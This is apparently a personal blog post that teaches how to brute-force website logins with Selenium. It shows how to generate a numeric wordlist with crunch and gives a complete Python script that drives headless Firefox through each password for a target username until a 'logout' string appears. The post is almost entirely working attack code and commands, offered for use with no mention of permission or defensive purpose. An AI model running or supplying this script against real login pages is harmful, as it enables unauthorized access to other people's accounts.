---
title: "Crack logins using Selenium and Python"
date: 2020-10-23T14:58:50+08:00
draft: false
tags: ["Python","Selenium"]
categories: ["randomStuff"]
---

Using selenium and headless firefox to force crack the website's logins.
<!--more-->
### Dependencies
- [Python 3](https://www.python.org/downloads/)
- [Selenium](https://github.com/SeleniumHQ/selenium/)
- [Crunch](https://tools.kali.org/password-attacks/crunch)
- [geckodriver (Firefox)](https://github.com/mozilla/geckodriver/)

To install python, simply go to [Download the latest version of Python](https://www.python.org/downloads/) and download the corresponding installer. For Linux and Mac OS X, you could also use your package manager to install python:

```console
// Python3
//  For debian based systems
    apt update
    apt -y install python3 python3-pip

//  For Mac OS X users:
    brew install python

// Selenium
    pip3 install selenium

// Crunch
    brew install crunch
    or 
    apt -y install crunch
    for debian based systems

// To install geckodriver
// You could also use chromedriver if you prefer chrome over firefox
// Take Mac OS X as example, you will need to download right archive for your system

    wget https://github.com/mozilla/geckodriver/releases/download/v0.27.0/geckodriver-v0.27.0-macos.tar.gz

    tar -xf geckodriver-v0.27.0-macos.tar.gz -C /usr/local/bin/

    chmod +x /usr/local/bin/geckodriver

```

### Code
#### Generating a dictionary
```text
// Usage: crunch <min> <max> [options]
// For example, I'm generating a dictionary with a minimum password length of 6   
// and the maximum password length of 8, saving it to </path/to/your/dictionary>

crunch 6 8 1234567890 -o /path/to/your/dictionary

```

```python
#coding:utf-8
import selenium
import selenium.webdriver
import time
from selenium.webdriver.firefox.options import Options
from selenium.webdriver import Firefox

def  loginoa(username,password):
    options = Options()
    options.add_argument("--headless")
    # If you prefer a GUI firefox, remove the above line
    driver=selenium.webdriver.Firefox(options=options)
    
    # URL to the login page
    driver.get("link/to/your/login/page")
    time.sleep(2)

    # find the input field
    # you could also find those elements by name, class name, xpath, etc
    user_text=driver.find_element_by_id("session_login") 
    password_text=driver.find_element_by_id("session_password")
    time.sleep(1)
    
    # send username and password
    user_text.send_keys(username)
    password_text.send_keys(password)
    time.sleep(1)
    
    # find the login button
    # you could also find those elements by name, class name, xpath, etc
    login=driver.find_element_by_name("commit") 
    
    # simulate login
    login.click()
    time.sleep(4)

    # check whether successfully logined
    islogin=  driver.page_source.find(u"logout")!=-1
    return islogin

# your dictionary
passfile=open("/path/to/your/dictionary","r")

while True:
    passline=passfile.readline()
    if not passline:
        break
    passlist= passline.split(" # ")
    
    # change 'your username' to a legit username
    islogin=loginoa("your username",passlist[0])
    
    # if successfully logined, break
    print(passlist[0],"login",islogin)
    if  islogin:
        break
```


### Reference
[selenium暴力破解密码，正确密码终止程序](https://www.cnblogs.com/my-global/p/12460987.html)
